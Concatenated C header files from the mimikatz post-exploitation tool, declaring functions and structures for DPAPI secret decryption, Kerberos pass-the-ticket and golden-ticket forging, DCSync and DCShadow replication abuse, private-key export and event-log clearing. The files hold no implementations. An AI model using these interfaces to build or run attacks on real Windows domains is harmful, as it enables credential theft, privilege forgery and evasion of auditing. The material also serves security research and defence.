void kuhl_m_dpapi_display_MasterkeyInfosAndFree(LPCGUID guid, PVOID data, DWORD dataLen, PSID sid);
void kuhl_m_dpapi_display_CredHist(PKULL_M_DPAPI_CREDHIST_ENTRY entry, LPCVOID ntlm, LPCVOID sha1);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"
//#include "kuhl_m_dpapi.h"
//#include "../modules/rpc/kull_m_rpc_dpapi-entries.h"

typedef struct _KUHL_M_DPAPI_OE_MASTERKEY_ENTRY {
	LIST_ENTRY navigator;
	KUHL_M_DPAPI_MASTERKEY_ENTRY data;
} KUHL_M_DPAPI_OE_MASTERKEY_ENTRY, *PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY;

#define KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4		0x00000001
#define KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1	0x00000002
#define KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4p	0x00000004
#define KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_GUID	0x80000000
typedef struct _KUHL_M_DPAPI_OE_CREDENTIAL_ENTRY {
	LIST_ENTRY navigator;
	KUHL_M_DPAPI_CREDENTIAL_ENTRY data;
/*	
	PVOID DPAPI_SYSTEM_machine;
	PVOID DPAPI_SYSTEM_user;
*/
} KUHL_M_DPAPI_OE_CREDENTIAL_ENTRY, *PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY;

typedef struct _KUHL_M_DPAPI_OE_DOMAINKEY_ENTRY {
	LIST_ENTRY navigator;
	KUHL_M_DPAPI_DOMAINKEY_ENTRY data;
} KUHL_M_DPAPI_OE_DOMAINKEY_ENTRY, *PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY;

NTSTATUS kuhl_m_dpapi_oe_clean();
NTSTATUS kuhl_m_dpapi_oe_cache(int argc, wchar_t * argv[]);
BOOL kuhl_m_dpapi_oe_is_sid_valid_ForCacheOrAuto(PSID sid, LPCWSTR szSid, BOOL AutoOrCache);
BOOL kuhl_m_dpapi_oe_autosid(LPCWSTR filename, LPWSTR * pSid);

LIST_ENTRY gDPAPI_Masterkeys;
LIST_ENTRY gDPAPI_Credentials;
LIST_ENTRY gDPAPI_Domainkeys;

PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY kuhl_m_dpapi_oe_masterkey_get(LPCGUID guid);
BOOL kuhl_m_dpapi_oe_masterkey_add(LPCGUID guid, LPCVOID key, DWORD keyLen);
void kuhl_m_dpapi_oe_masterkey_delete(PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry);
void kuhl_m_dpapi_oe_masterkey_descr(PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry);
void kuhl_m_dpapi_oe_masterkeys_delete();
void kuhl_m_dpapi_oe_masterkeys_descr();

PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY kuhl_m_dpapi_oe_credential_get(LPCWSTR sid, LPCGUID guid);
BOOL kuhl_m_dpapi_oe_credential_add(LPCWSTR sid, LPCGUID guid, LPCVOID md4hash, LPCVOID sha1hash, LPCVOID md4protectedhash, LPCWSTR password);
void kuhl_m_dpapi_oe_credential_delete(PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY entry);
void kuhl_m_dpapi_oe_credential_descr(PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY entry);
void kuhl_m_dpapi_oe_credentials_delete();
void kuhl_m_dpapi_oe_credentials_descr();

PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY kuhl_m_dpapi_oe_domainkey_get(LPCGUID guid);
BOOL kuhl_m_dpapi_oe_domainkey_add(LPCGUID guid, LPCVOID key, DWORD keyLen, BOOL isNewKey);
void kuhl_m_dpapi_oe_domainkey_delete(PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY entry);
void kuhl_m_dpapi_oe_domainkey_descr(PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY entry);
void kuhl_m_dpapi_oe_domainkeys_delete();
void kuhl_m_dpapi_oe_domainkeys_descr();

BOOL kuhl_m_dpapi_oe_credential_addtoEntry(PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY entry, LPCGUID guid, LPCVOID md4hash, LPCVOID sha1hash, LPCVOID md4protectedhash, LPCWSTR password);
BOOL kuhl_m_dpapi_oe_credential_copyEntryWithNewGuid(PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY entry, LPCGUID guid);

BOOL kuhl_m_dpapi_oe_SaveToFile(LPCWSTR filename);
BOOL kuhl_m_dpapi_oe_LoadFromFile(LPCWSTR filename);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_crypto_system.h"
//#include "kuhl_m_kerberos_ticket.h"
//#include "kuhl_m_kerberos_pac.h"
//#include "kuhl_m_kerberos_ccache.h"

#define KRB_KEY_USAGE_AS_REP_TGS_REP	2

typedef struct _KUHL_M_KERBEROS_LIFETIME_DATA {
	FILETIME TicketStart;
	FILETIME TicketEnd;
	FILETIME TicketRenew;
} KUHL_M_KERBEROS_LIFETIME_DATA, *PKUHL_M_KERBEROS_LIFETIME_DATA;

const KUHL_M kuhl_m_kerberos;

NTSTATUS kuhl_m_kerberos_init();
NTSTATUS kuhl_m_kerberos_clean();

NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus);

NTSTATUS kuhl_m_kerberos_ptt(int argc, wchar_t * argv[]);
BOOL CALLBACK kuhl_m_kerberos_ptt_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg);
void kuhl_m_kerberos_ptt_file(PCWCHAR filename);
NTSTATUS kuhl_m_kerberos_ptt_data(PVOID data, DWORD dataSize);
NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_ask(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_tgt(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_purge(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_hash(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_decode(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_test(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_kerberos_hash_data_raw(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count, PBYTE *buffer, DWORD *dwBuffer);
NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count);
wchar_t * kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext);
wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext);
PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, 
									LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, 
									LPCBYTE key, DWORD keySize, DWORD keyType, PISID sid, LPCWSTR LogonDomainName, 
									DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, 
									DWORD cbSids, DWORD rodc, PCLAIMS_SET pClaimsSet);
NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD keySize, LPCVOID data, DWORD dataSize, LPVOID *output, DWORD *outputSize, BOOL encrypt);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m_kerberos.h"
//#include "../modules/kull_m_file.h"

/* Info : https://www.gnu.org/software/shishi/manual/html_node/The-Credential-Cache-Binary-File-Format.html */

NTSTATUS kuhl_m_kerberos_ccache_enum(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave);
NTSTATUS kuhl_m_kerberos_ccache_ptc(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_kerberos_ccache_list(int argc, wchar_t * argv[]);

void kuhl_m_kerberos_ccache_UnixTimeToFileTime(time_t t, LPFILETIME pft);
BOOL kuhl_m_kerberos_ccache_unicode_string(PBYTE *data, PUNICODE_STRING ustring);
BOOL kuhl_m_kerberos_ccache_externalname(PBYTE *data, PKERB_EXTERNAL_NAME * name, PUNICODE_STRING realm);
void kuhl_m_kerberos_ccache_skip_buffer(PBYTE *data);
void kuhl_m_kerberos_ccache_skip_struct_with_buffer(PBYTE *data);
wchar_t * kuhl_m_kerberos_ccache_generateFileName(const DWORD index, PKIWI_KERBEROS_TICKET ticket, LPCWSTR ext);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../modules/rpc/kull_m_rpc_ms-claims.h"

PCLAIMS_SET kuhl_m_kerberos_claims_createFromString(LPCWCHAR string);
void kuhl_m_kerberos_claims_free(PCLAIMS_SET claimsSet);
void kuhl_m_kerberos_claims_displayClaimsSet(PCLAIMS_SET claimsSet);
BOOL kuhl_m_kerberos_claims_encode_ClaimsSet(PCLAIMS_SET claimsSet, PVOID *encoded, DWORD *dwEncoded);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "kuhl_m_kerberos_claims.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_crypto_system.h"
//#include "../modules/rpc/kull_m_rpc_ms-pac.h"

#define DEFAULT_GROUP_ATTRIBUTES	(SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED)

#pragma pack(push, 4) 
typedef struct _PAC_SIGNATURE_DATA {
	LONG  SignatureType;
	UCHAR  Signature[ANYSIZE_ARRAY];// LM_NTLM_HASH_LENGTH];
	//USHORT RODCIdentifier;
	//USHORT  Reserverd;
} PAC_SIGNATURE_DATA, *PPAC_SIGNATURE_DATA;
#pragma pack(pop)

BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFILETIME authtime, LPCWSTR clientname, LONG SignatureType, PCLAIMS_SET pClaimsSet, PPACTYPE * pacType, DWORD * pacLength);
BOOL kuhl_m_pac_validationInfo_to_CNAME_TINFO(PFILETIME authtime, LPCWSTR clientname, PPAC_CLIENT_INFO * pacClientInfo, DWORD * pacClientInfoLength);
NTSTATUS kuhl_m_pac_signature(PPACTYPE pacType, DWORD pacLenght, LONG SignatureType, LPCVOID key, DWORD keySize);
PKERB_VALIDATION_INFO kuhl_m_pac_infoToValidationInfo(PFILETIME authtime, LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, PISID sid, ULONG rid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids);
BOOL kuhl_m_pac_stringToGroups(PCWSTR szGroups, PGROUP_MEMBERSHIP *groups, DWORD *cbGroups);
BOOL kuhl_m_pac_stringToSids(PCWSTR szSids, PKERB_SID_AND_ATTRIBUTES *sids, DWORD *cbSids);

#if defined(KERBEROS_TOOLS)
NTSTATUS kuhl_m_kerberos_pac_info(int argc, wchar_t * argv[]);
#endif

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../kuhl_m.h"
//#include "../modules/kull_m_asn1.h"


void kuhl_m_kerberos_ticket_display(PKIWI_KERBEROS_TICKET ticket, BOOL withKey, BOOL encodedTicketToo);
void kuhl_m_kerberos_ticket_displayFlags(ULONG flags);
void kuhl_m_kerberos_ticket_displayExternalName(IN LPCWSTR prefix, IN PKERB_EXTERNAL_NAME pExternalName, IN PUNICODE_STRING pDomain);
BOOL kuhl_m_kerberos_ticket_isLongFilename(PKIWI_KERBEROS_TICKET ticket);
PCWCHAR kuhl_m_kerberos_ticket_etype(LONG eType);
PCWCHAR kuhl_m_kerberos_ticket_ctype(LONG cType);

void kuhl_m_kerberos_ticket_freeTicket(PKIWI_KERBEROS_TICKET ticket);
PKERB_EXTERNAL_NAME kuhl_m_kerberos_ticket_copyExternalName(PKERB_EXTERNAL_NAME pName);
void kuhl_m_kerberos_ticket_freeExternalName(PKERB_EXTERNAL_NAME pName);
void kuhl_m_kerberos_ticket_freeKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer);

PBERVAL kuhl_m_kerberos_ticket_createAppKrbCred(PKIWI_KERBEROS_TICKET ticket, BOOL valueIsTicket);
PBERVAL kuhl_m_kerberos_ticket_createAppEncTicketPart(PKIWI_KERBEROS_TICKET ticket, LPCVOID PacAuthData, DWORD PacAuthDataSize);

void kuhl_m_kerberos_ticket_createSequenceEncryptedData(BerElement * pBer, LONG eType, ULONG kvNo, LPCVOID data, DWORD size);
void kuhl_m_kerberos_ticket_createSequenceEncryptionKey(BerElement * pBer, LONG eType, LPCVOID data, DWORD size);
void kuhl_m_kerberos_ticket_createSequencePrimaryName(BerElement * pBer, PKERB_EXTERNAL_NAME name);



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "../modules/rpc/kull_m_rpc_drsr.h"
//#include "../kuhl_m.h"
//#include "../kuhl_m_lsadump.h" // to move
//#include "../modules/kull_m_string.h"
//#include "../modules/kull_m_ldap.h"

NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_lsadump_dcshadow(int argc, wchar_t * argv[]);

#pragma pack(push, 1) 
typedef struct _USER_PROPERTY {
	USHORT NameLength;
	USHORT ValueLength;
	USHORT Reserved;
	wchar_t PropertyName[ANYSIZE_ARRAY];
	// PropertyValue in HEX !
} USER_PROPERTY, *PUSER_PROPERTY;

typedef struct _USER_PROPERTIES {
	DWORD Reserved1;
	DWORD Length;
	USHORT Reserved2;
	USHORT Reserved3;
	BYTE Reserved4[96];
	wchar_t PropertySignature;
	USHORT PropertyCount;
	USER_PROPERTY UserProperties[ANYSIZE_ARRAY];
} USER_PROPERTIES, *PUSER_PROPERTIES;
#pragma pack(pop)

const wchar_t * KUHL_M_LSADUMP_UF_FLAG[32];

BOOL kuhl_m_lsadump_dcsync_SearchAndParseLDAPToIntId(PLDAP ld, PWCHAR dn, PWCHAR req, ATTRTYP *pIntId);
BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory);
void kuhl_m_lsadump_dcsync_descrObject(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain, BOOL someExport, ATTRTYP *pSuppATT_IntId, DWORD cSuppATT_IntId);
void kuhl_m_lsadump_dcsync_descrUser(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, ATTRTYP *pSuppATT_IntId, DWORD cSuppATT_IntId);
void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties);
void kuhl_m_lsadump_dcsync_descrTrust(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, LPCWSTR szSrcDomain);
void kuhl_m_lsadump_dcsync_descrTrustAuthentication(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, PCUNICODE_STRING domain, PCUNICODE_STRING partner, BOOL isIn);
void kuhl_m_lsadump_dcsync_descrSecret(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL someExport);
void kuhl_m_lsadump_dcsync_descrBitlocker(SCHEMA_PREFIX_TABLE* prefixTable, ATTRBLOCK* attributes, BOOL someExport);
void kuhl_m_lsadump_dcsync_descrObject_csv(SCHEMA_PREFIX_TABLE *prefixTable, ATTRBLOCK *attributes, BOOL withDeleted, BOOL decodeUAC);

typedef BOOL (*DCSHADOW_SYNTAX_ENCODER) (ATTRVAL* pVal, PWSTR szValue);

typedef struct _DS_REPL_ATTRTYP_META_DATA {
	ATTRTYP attrType;
	DWORD dwVersion;
	FILETIME ftimeLastOriginatingChange;
	UUID uuidLastOriginatingDsaInvocationID;
	USN usnOriginatingChange;
	USN usnLocalChange;
} DS_REPL_ATTRTYP_META_DATA, *PDS_REPL_ATTRTYP_META_DATA;

typedef struct _DS_REPL_OBJ_TYPE_META_DATA {
	DWORD cNumEntries;
	DWORD dwReserved;
	DS_REPL_ATTRTYP_META_DATA rgMetaData[ANYSIZE_ARRAY];
} DS_REPL_OBJ_TYPE_META_DATA, *PDS_REPL_OBJ_TYPE_META_DATA;

typedef struct _DS_REPL_OBJ_TYPE_META_DATA_BLOB {
	DWORD dwVersion;
	DWORD dwReserved;
	DS_REPL_OBJ_TYPE_META_DATA ctr;
} DS_REPL_OBJ_TYPE_META_DATA_BLOB, *PDS_REPL_OBJ_TYPE_META_DATA_BLOB;

typedef struct _DCSHADOW_OBJECT_ATTRIBUTE {
	PWSTR szAttributeName;
	PSTR Oid;
	DWORD dwSyntax;
	BOOL fIsSensitive;
} DCSHADOW_OBJECT_ATTRIBUTE, *PDCSHADOW_OBJECT_ATTRIBUTE;

#define REPLICATION_UID_SET		(1)
#define REPLICATION_USN_SET		(1 << 1)
#define REPLICATION_TIME_SET	(1 << 2)
#define OBJECT_TO_ADD			(1)
#define OBJECT_DYNAMIC			(1 << 1)

typedef struct _DCSHADOW_OBJECT_ATTRIBUTE_METADATA {
	DWORD dwFlag;
	GUID uidOriginatingDsa;
	DWORD usnOriginating;
	FILETIME usnTimeChanged;
	DWORD curRevision;
	FILETIME curTimeChanged;
} DCSHADOW_OBJECT_ATTRIBUTE_METADATA, *PDCSHADOW_OBJECT_ATTRIBUTE_METADATA;

typedef struct _DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE {
	PDCSHADOW_OBJECT_ATTRIBUTE pAttribute;
	DCSHADOW_OBJECT_ATTRIBUTE_METADATA MetaData;
	ATTRVALBLOCK AttrVal;
	PWSTR * pszValue;
} DCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE, *PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE;

typedef struct _DCSHADOW_PUSH_REQUEST_OBJECT {
	PWSTR szObjectDN;
	// mandatory for object creation and/or password encoding
	NT4SID pSid;
	// mandatory for object creation
	GUID ObjectGUID;
	GUID ParentGuid;
	ULONG cbAttributes;
	PDCSHADOW_PUSH_REQUEST_OBJECT_ATTRIBUTE pAttributes;
	DWORD dwFlag;
} DCSHADOW_PUSH_REQUEST_OBJECT, *PDCSHADOW_PUSH_REQUEST_OBJECT;

typedef struct _DCSHADOW_PUSH_REQUEST {
	ULONG cNumObjects;
	PDCSHADOW_PUSH_REQUEST_OBJECT pObjects;
	ULONG cNumAttributes;
	PDCSHADOW_OBJECT_ATTRIBUTE pAttributes;
} DCSHADOW_PUSH_REQUEST, *PDCSHADOW_PUSH_REQUEST;

typedef struct _DCSHADOW_DOMAIN_DC_INFO {
	BOOL isInstanceId;
	GUID InstanceId;
	BOOL isInvocationId;
	GUID InvocationId;
} DCSHADOW_DOMAIN_DC_INFO, *PDCSHADOW_DOMAIN_DC_INFO;

#define DOMAIN_INFO_PUSH_FLAGS_ROOT		1
#define DOMAIN_INFO_PUSH_FLAGS_CONFIG	2
#define DOMAIN_INFO_PUSH_FLAGS_SCHEMA	4
#define DOMAIN_INFO_PUSH_REMOTE_MODIFY  8

typedef struct _DCSHADOW_DOMAIN_INFO {
	// dns name - arg or local assigned var freed
	PWSTR szDomainName;
	PWSTR szDCFQDN;
	// not to be freed - arg or static var
	PWSTR szFakeDCNetBIOS;
	PWSTR szFakeFQDN;
	PWSTR szFakeDN;
	// naming context of the AD
	PWSTR szDomainNamingContext;
	PWSTR szConfigurationNamingContext;
	PWSTR szSchemaNamingContext;
	// The site (first-or-default in general)
	PWSTR szDsServiceName;
	PWSTR szDCDsServiceName;
	DWORD dwDomainControllerFunctionality;
	DWORD dwReplEpoch;
	DWORD maxDCUsn;
	BOOL fUseSchemaSignature;
	BYTE pbSchemaSignature[21];
	DWORD dwPushFlags;
	DCSHADOW_DOMAIN_DC_INFO realDc;
	DCSHADOW_DOMAIN_DC_INFO mimiDc;
	LDAP* ld;
	HANDLE hGetNCChangeCalled;
	// the only attribute which can be there in a next call
	PDCSHADOW_PUSH_REQUEST request;
} DCSHADOW_DOMAIN_INFO, *PDCSHADOW_DOMAIN_INFO;



/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "globals.h"






/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../../modules/kull_m_acr.h"
//#include "../../modules/kull_m_pn532.h"

const KUHL_M kuhl_m_acr;

NTSTATUS kuhl_m_acr_init();
NTSTATUS kuhl_m_acr_clean();

NTSTATUS kuhl_m_acr_open(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_acr_close(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_acr_firmware(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_acr_info(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_busylight.h"
//#include "../modules/kull_m_string.h"

const KUHL_M kuhl_m_busylight;

NTSTATUS kuhl_m_busylight_init();
NTSTATUS kuhl_m_busylight_clean();

NTSTATUS kuhl_m_busylight_status(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_busylight_list(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_busylight_off(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_busylight_single(int argc, wchar_t * argv[]);

NTSTATUS kuhl_m_busylight_test(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_crypto.h"
//#include "../modules/kull_m_string.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_registry.h"
//#include "sekurlsa/kuhl_m_sekurlsa.h"
//#include "crypto/kuhl_m_crypto_sc.h"
//#include "crypto/kuhl_m_crypto_extractor.h"
//#include "crypto/kuhl_m_crypto_patch.h"
//#include "crypto/kuhl_m_crypto_pki.h"

typedef struct _KUHL_M_CRYPTO_DWORD_TO_DWORD {
	PCWSTR	name;
	DWORD	id;
} KUHL_M_CRYPTO_DWORD_TO_DWORD, *PKUHL_M_CRYPTO_DWORD_TO_DWORD;

typedef struct _KUHL_M_CRYPTO_NAME_TO_REALNAME {
	PCWSTR	name;
	PCWSTR	realname;
} KUHL_M_CRYPTO_NAME_TO_REALNAME, *PKUHL_M_CRYPTO_NAME_TO_REALNAME;

typedef struct _KUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO {
	DWORD offsetContainerName;
	DWORD offsetProvName;
	DWORD dwProvType;
	DWORD dwFlags;
	DWORD cProvParam;
	DWORD offsetRgProvParam;
	DWORD dwKeySpec;
} KUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO, *PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO;

typedef struct _KUHL_M_CRYPTO_CERT_PROP {
	DWORD dwPropId;
	DWORD flags; // ?
	DWORD size;
	BYTE data[ANYSIZE_ARRAY];
} KUHL_M_CRYPTO_CERT_PROP, *PKUHL_M_CRYPTO_CERT_PROP;

typedef struct _KUHL_M_CRYPTO_NCRYPT_GROUP_TO_EXPORT {
	PCWSTR pszAlgorithmGroup;
	PCWSTR pszBlobType;
	PCWSTR pszExtension;
	BOOL needPVKHeader;
} KUHL_M_CRYPTO_NCRYPT_GROUP_TO_EXPORT, *PKUHL_M_CRYPTO_NCRYPT_GROUP_TO_EXPORT;

const KUHL_M kuhl_m_crypto;

NTSTATUS kuhl_m_crypto_init();
NTSTATUS kuhl_m_crypto_clean();

NTSTATUS kuhl_m_crypto_l_providers(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_l_stores(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_l_certificates(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_l_keys(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_hash(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_system(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_c_cert_to_hw(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_keyutil(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_crypto_platforminfo(int argc, wchar_t * argv[]);

BOOL WINAPI kuhl_m_crypto_l_stores_enumCallback_print(const void *pvSystemStore, DWORD dwFlags, PCERT_SYSTEM_STORE_INFO pStoreInfo, void *pvReserved, void *pvArg);
void kuhl_m_crypto_certificate_descr(PCCERT_CONTEXT pCertContext);

void kuhl_m_crypto_printKeyInfos(NCRYPT_KEY_HANDLE hCNGKey, HCRYPTKEY hCAPIKey, OPTIONAL HCRYPTPROV hCAPIProv);
void kuhl_m_crypto_exportRawKeyToFile(LPCVOID data, DWORD size, BOOL isCNG, DWORD dwKeySpec, DWORD dwProviderType, const wchar_t * store, const DWORD index, const wchar_t * name, BOOL wantExport, BOOL wantInfos);
void kuhl_m_crypto_exportKeyToFile(NCRYPT_KEY_HANDLE hCngKey, HCRYPTKEY hCapiKey, DWORD keySpec, const wchar_t * store, const DWORD index, const wchar_t * name);
void kuhl_m_crypto_exportCert(PCCERT_CONTEXT pCertificate, BOOL havePrivateKey, const wchar_t * systemStore, const wchar_t * store, const DWORD index, const wchar_t * name);
wchar_t * kuhl_m_crypto_generateFileName(const wchar_t * term0, const wchar_t * term1, const DWORD index, const wchar_t * name, const wchar_t * ext);
void kuhl_m_crypto_file_rawData(PKUHL_M_CRYPTO_CERT_PROP prop, PCWCHAR inFile, BOOL isExport);
void kuhl_m_crypto_l_keys_capi(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags, BOOL export, LPCWSTR szStore);
void kuhl_m_crypto_l_keys_cng(LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwFlags, BOOL export, LPCWSTR szStore);

BOOL kuhl_m_crypto_system_data(PBYTE data, DWORD len, PCWCHAR originalName, BOOL isExport);
BOOL CALLBACK kuhl_m_crypto_system_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg);

/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_file.h"
//#include "../modules/kull_m_dpapi.h"

const KUHL_M kuhl_m_dpapi;

NTSTATUS kuhl_m_dpapi_masterkeys(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_process.h"
//#include "../modules/kull_m_service.h"
//#include "../modules/kull_m_memory.h"
//#include "../modules/kull_m_patch.h"

const KUHL_M kuhl_m_event;

NTSTATUS kuhl_m_event_drop(int argc, wchar_t * argv[]);
NTSTATUS kuhl_m_event_clear(int argc, wchar_t * argv[]);

/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
//#pragma once
//#include "kuhl_m.h"
//#include "../modules/kull_m_crypto.h"
//#include "../modules/kull_m_xml.h"
//#include "../modules/kull_m_file.h"

const KUHL_M kuhl_m_iis;

NTSTATUS kuhl_m_iis_apphost(int argc, wchar_t * argv[]);


typedef enum _IISXMLType {
	IISXMLType_Providers,
	IISXMLType_ApplicationPools,
	IISXMLType_Sites,
} IISXMLType;

void kuhl_m_iis_apphost_genericEnumNodes(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, PCWSTR path, IISXMLType xmltype, LPCWSTR provider, LPCBYTE data, DWORD szData);
BOOL kuhl_m_iis_apphost_provider(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode, LPCWSTR provider, LPCBYTE data, DWORD szData);
void kuhl_m_iis_apphost_apppool(int argc, wchar_t * argv[], IXMLDOMDocument *pXMLDom, IXMLDOMNode *pNode);
